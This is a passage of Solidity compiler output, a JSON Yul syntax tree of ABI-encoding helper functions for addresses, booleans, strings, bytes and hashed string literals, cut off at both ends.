11002:3:15"}]},{"nodeType":"YulAssignment","src":"11114:10:15","value":{"name":"pos","nodeType":"YulIdentifier","src":"11121:3:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"11114:3:15"}]}]},"name":"abi_encode_tuple_packed_t_string_memory_ptr_t_string_memory_ptr__to_t_string_memory_ptr_t_string_memory_ptr__nonPadded_inplace_fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"10850:3:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"10856:6:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"10864:6:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"10875:3:15","type":""}],"src":"10695:435:15"},{"body":{"nodeType":"YulBlock","src":"11234:124:15","statements":[{"nodeType":"YulAssignment","src":"11244:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11256:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11267:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11252:3:15"},"nodeType":"YulFunctionCall","src":"11252:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"11244:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"11324:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11337:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11348:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11333:3:15"},"nodeType":"YulFunctionCall","src":"11333:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11280:43:15"},"nodeType":"YulFunctionCall","src":"11280:71:15"},"nodeType":"YulExpressionStatement","src":"11280:71:15"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"11206:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"11218:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"11229:4:15","type":""}],"src":"11136:222:15"},{"body":{"nodeType":"YulBlock","src":"11564:440:15","statements":[{"nodeType":"YulAssignment","src":"11574:27:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11586:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11597:3:15","type":"","value":"128"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11582:3:15"},"nodeType":"YulFunctionCall","src":"11582:19:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"11574:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"11655:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11668:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11679:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11664:3:15"},"nodeType":"YulFunctionCall","src":"11664:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11611:43:15"},"nodeType":"YulFunctionCall","src":"11611:71:15"},"nodeType":"YulExpressionStatement","src":"11611:71:15"},{"expression":{"arguments":[{"name":"value1","nodeType":"YulIdentifier","src":"11736:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11749:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11760:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11745:3:15"},"nodeType":"YulFunctionCall","src":"11745:18:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11692:43:15"},"nodeType":"YulFunctionCall","src":"11692:72:15"},"nodeType":"YulExpressionStatement","src":"11692:72:15"},{"expression":{"arguments":[{"name":"value2","nodeType":"YulIdentifier","src":"11818:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11831:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11842:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11827:3:15"},"nodeType":"YulFunctionCall","src":"11827:18:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"11774:43:15"},"nodeType":"YulFunctionCall","src":"11774:72:15"},"nodeType":"YulExpressionStatement","src":"11774:72:15"},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11867:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11878:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11863:3:15"},"nodeType":"YulFunctionCall","src":"11863:18:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"11887:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"11893:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"11883:3:15"},"nodeType":"YulFunctionCall","src":"11883:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"11856:6:15"},"nodeType":"YulFunctionCall","src":"11856:48:15"},"nodeType":"YulExpressionStatement","src":"11856:48:15"},{"nodeType":"YulAssignment","src":"11913:84:15","value":{"arguments":[{"name":"value3","nodeType":"YulIdentifier","src":"11983:6:15"},{"name":"tail","nodeType":"YulIdentifier","src":"11992:4:15"}],"functionName":{"name":"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"11921:61:15"},"nodeType":"YulFunctionCall","src":"11921:76:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"11913:4:15"}]}]},"name":"abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"11512:9:15","type":""},{"name":"value3","nodeType":"YulTypedName","src":"11524:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"11532:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"11540:6:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"11548:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"11559:4:15","type":""}],"src":"11364:640:15"},{"body":{"nodeType":"YulBlock","src":"12102:118:15","statements":[{"nodeType":"YulAssignment","src":"12112:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12124:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12135:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12120:3:15"},"nodeType":"YulFunctionCall","src":"12120:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12112:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"12186:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12199:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12210:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12195:3:15"},"nodeType":"YulFunctionCall","src":"12195:17:15"}],"functionName":{"name":"abi_encode_t_bool_to_t_bool_fromStack","nodeType":"YulIdentifier","src":"12148:37:15"},"nodeType":"YulFunctionCall","src":"12148:65:15"},"nodeType":"YulExpressionStatement","src":"12148:65:15"}]},"name":"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12074:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"12086:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"12097:4:15","type":""}],"src":"12010:210:15"},{"body":{"nodeType":"YulBlock","src":"12344:195:15","statements":[{"nodeType":"YulAssignment","src":"12354:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12366:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12377:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12362:3:15"},"nodeType":"YulFunctionCall","src":"12362:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12354:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12401:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12412:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12397:3:15"},"nodeType":"YulFunctionCall","src":"12397:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"12420:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"12426:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"12416:3:15"},"nodeType":"YulFunctionCall","src":"12416:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"12390:6:15"},"nodeType":"YulFunctionCall","src":"12390:47:15"},"nodeType":"YulExpressionStatement","src":"12390:47:15"},{"nodeType":"YulAssignment","src":"12446:86:15","value":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"12518:6:15"},{"name":"tail","nodeType":"YulIdentifier","src":"12527:4:15"}],"functionName":{"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"12454:63:15"},"nodeType":"YulFunctionCall","src":"12454:78:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12446:4:15"}]}]},"name":"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12316:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"12328:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"12339:4:15","type":""}],"src":"12226:313:15"},{"body":{"nodeType":"YulBlock","src":"12716:248:15","statements":[{"nodeType":"YulAssignment","src":"12726:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12738:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12749:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12734:3:15"},"nodeType":"YulFunctionCall","src":"12734:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12726:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12773:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12784:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12769:3:15"},"nodeType":"YulFunctionCall","src":"12769:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"12792:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"12798:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"12788:3:15"},"nodeType":"YulFunctionCall","src":"12788:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"12762:6:15"},"nodeType":"YulFunctionCall","src":"12762:47:15"},"nodeType":"YulExpressionStatement","src":"12762:47:15"},{"nodeType":"YulAssignment","src":"12818:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"12952:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"12826:124:15"},"nodeType":"YulFunctionCall","src":"12826:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12818:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12696:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"12711:4:15","type":""}],"src":"12545:419:15"},{"body":{"nodeType":"YulBlock","src":"13141:248:15","statements":[{"nodeType":"YulAssignment","src":"13151:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13163:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13174:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13159:3:15"},"nodeType":"YulFunctionCall","src":"13159:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13151:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13198:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13209:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13194:3:15"},"nodeType":"YulFunctionCall","src":"13194:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13217:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13223:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13213:3:15"},"nodeType":"YulFunctionCall","src":"13213:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13187:6:15"},"nodeType":"YulFunctionCall","src":"13187:47:15"},"nodeType":"YulExpressionStatement","src":"13187:47:15"},{"nodeType":"YulAssignment","src":"13243:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13377:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13251:124:15"},"nodeType":"YulFunctionCall","src":"13251:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13243:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"13121:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13136:4:15","type":""}],"src":"12970:419:15"},{"body":{"nodeType":"YulBlock","src":"13566:248:15","statements":[{"nodeType":"YulAssignment","src":"13576:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13588:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13599:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13584:3:15"},"nodeType":"YulFunctionCall","src":"13584:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13576:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13623:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13634:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13619:3:15"},"nodeType":"YulFunctionCall","src":"13619:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13642:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13648:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13638:3:15"},"nodeType":"YulFunctionCall","src":"13638:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13612:6:15"},"nodeType":"YulFunctionCall","src":"13612:47:15"},"nodeType":"YulExpressionStatement","src":"13612:47:15"},{"nodeType":"YulAssignment","src":"13668:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13802:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13676:124:15"},"nodeType":"YulFunctionCall","src":"13676:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13668:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"13546:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13561:4:15","type":""}],"src":"13395:419:15"},{"body":{"nodeType":"YulBlock","src":"13991:248:15","statements":[{"nodeType":"YulAssignment","src":"14001:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14013:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14024:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14009:3:15"},"nodeType":"YulFunctionCall","src":"14009:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14001:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14048:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14059:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14044:3:15"},"nodeType":"YulFunctionCall","src":"14044:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14067:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"14073:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"14063:3:15"},"nodeType":"YulFunctionCall","src":"14063:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"14037:6:15"},"nodeType":"YulFunctionCall","src":"14037:47:15"},"nodeType":"YulExpressionStatement","src":"14037:47:15"},{"nodeType":"YulAssignment","src":"14093:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14227:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"14101:124:15"},"nodeType":"YulFunctionCall","src":"14101:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14093:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"13971:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13986:4:15","type":""}],"src":"13820:419:15"},{"body":{"nodeType":"YulBlock","src":"14416:248:15","statements":[{"nodeType":"YulAssignment","src":"14426:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14438:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14449:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14434:3:15"},"nodeType":"YulFunctionCall","src":"14434:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14426:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14473:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14484:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14469:3:15"},"nodeType":"YulFunctionCall","src":"14469:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14492:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"14498:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"14488:3:15"},"nodeType":"YulFunctionCall","src":"14488:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"14462:6:15"},"nodeType":"YulFunctionCall","src":"14462:47:15"},"nodeType":"YulExpressionStatement","src":"14462:47:15"},{"nodeType":"YulAssignment","src":"14518:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14652:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"14526:124:15"},"nodeType":"YulFunctionCall","src":"14526:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14518:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"14396:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"14411:4:15","type":""}],"src":"14245:419:15"},{"body":{"nodeType":"YulBlock","src":"14841:248:15","statements":[{"nodeType":"YulAssignment","src":"14851:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14863:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14874:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14859:3:15"},"nodeType":"YulFunctionCall","src":"14859:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14851:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14898:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14909:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14894:3:15"},"nodeType":"YulFunctionCall","src":"14894:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14917:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"14923:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"14913:3:15"},"nodeType":"YulFunctionCall","src":"14913:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"14887:6:15"},"nodeType":"YulFunctionCall","src":"14887:47:15"},"nodeType":"YulExpressionStatement","src":"14887:47:15"},{"nodeType":"YulAssignment","src":"14943:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15077:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"14951:124:15"},"nodeType":"YulFunctionCall","src":"14951:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14943:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"14821:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"14836:4:15","type":""}],"src":"14670:419:15"},{"body":{"nodeType":"YulBlock","src":"15266:248:15","statements":[{"nodeType":"YulAssignment","src":"15276:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15288:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15299:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15284:3:15"},"nodeType":"YulFunctionCall","src":"15284:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15276:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15323:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15334:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15319:3:15"},"nodeType":"YulFunctionCall","src":"15319:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15342:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"15348:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"15338:3:15"},"nodeType":"YulFunctionCall","src":"15338:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"15312:6:15"},"nodeType":"YulFunctionCall","src":"15312:47:15"},"nodeType":"YulExpressionStatement","src":"15312:47:15"},{"nodeType":"YulAssignment","src":"15368:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15502:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"15376:124:15"},"nodeType":"YulFunctionCall","src":"15376:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15368:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15246:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15261:4:15","type":""}],"src":"15095:419:15"},{"body":{"nodeType":"YulBlock","src":"15691:248:15","statements":[{"nodeType":"YulAssignment","src":"15701:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15713:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15724:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15709:3:15"},"nodeType":"YulFunctionCall","src":"15709:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15701:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15748:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15759:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15744:3:15"},"nodeType":"YulFunctionCall","src":"15744:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15767:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"15773:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"15763:3:15"},"nodeType":"YulFunctionCall","src":"15763:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"15737:6:15"},"nodeType":"YulFunctionCall","src":"15737:47:15"},"nodeType":"YulExpressionStatement","src":"15737:47:15"},{"nodeType":"YulAssignment","src":"15793:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15927:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"15801:124:15"},"nodeType":"YulFunctionCall","src":"15801:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15793:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15671:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15686:4:15","type":""}],"src":"15520:419:15"},{"body":{"nodeType":"YulBlock","src":"16116:248:15","statements":[{"nodeType":"YulAssignment","src":"16126:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16138:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16149:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16134:3:15"},"nodeType":"YulFunctionCall","src":"16134:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16126:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16173:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16184:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16169:3:15"},"nodeType":"YulFunctionCall","src":"16169:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16192:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"16198:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"16188:3:15"},"nodeType":"YulFunctionCall","src":"16188:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"16162:6:15"},"nodeType":"YulFunctionCall","src":"16162:47:15"},"nodeType":"YulExpressionStatement","src":"16162:47:15"},{"nodeType":"YulAssignment","src":"16218:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16352:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"16226:124:15"},"nodeType":"YulFunctionCall","src":"16226:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16218:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"16096:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"16111:4:15","type":""}],"src":"15945:419:15"},{"body":{"nodeType":"YulBlock","src":"16468:124:15","statements":[{"nodeType":"YulAssignment","src":"16478:26:15","value":{"arguments":[